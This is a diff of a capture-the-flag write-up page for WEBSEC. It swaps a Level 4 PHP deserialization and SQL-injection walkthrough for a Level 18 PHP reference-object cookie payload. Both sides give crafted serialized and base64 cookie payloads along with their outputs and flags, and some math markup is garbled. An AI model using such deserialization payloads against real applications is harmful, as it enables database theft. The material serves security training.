@@ -76,38 +76,40 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-18">WEBSEC Level 18</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
-<h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
+<p>Can you please give it back? Thanks.</p>
 
-
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
-
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
+<h3 id="walk-through">Walk through</h3>
+<p>STEP 1: Payload to point the <span class="math"><em>o</em><em>b</em><em>j</em> −  &gt; <em>i</em><em>n</em><em>p</em><em>u</em><em>t</em><em>t</em><em>o</em><em>t</em><em>h</em><em>e</em><em>r</em><em>e</em><em>f</em><em>e</em><em>r</em><em>e</em><em>n</em><em>c</em><em>e</em><em>o</em><em>f</em></span>obj-&gt;flag which in turn points to $flag</p>
+<p>input = &amp;<span class="math"><em>o</em><em>b</em><em>j</em> −  &gt; <em>f</em><em>l</em><em>a</em><em>g</em>; <em>e</em><em>c</em><em>h</em><em>o</em><em>s</em><em>e</em><em>r</em><em>i</em><em>a</em><em>l</em><em>i</em><em>z</em><em>e</em>(</span>obj); OUTPUT: O:8:&quot;stdClass&quot;:2:{s:4:&quot;flag&quot;;N;s:5:&quot;input&quot;;R:2;} STEP 2: URL Encode the output OUTPUT: O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3BN%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D STEP 3: Insert the output as the obj cookie value OUTPUT: Here is your flag: WEBSEC{You_have_impressive_refrences.<em>We'll</em>call_you_back.}.</p>
 <h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><strong>FLAG</strong>: <code>WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
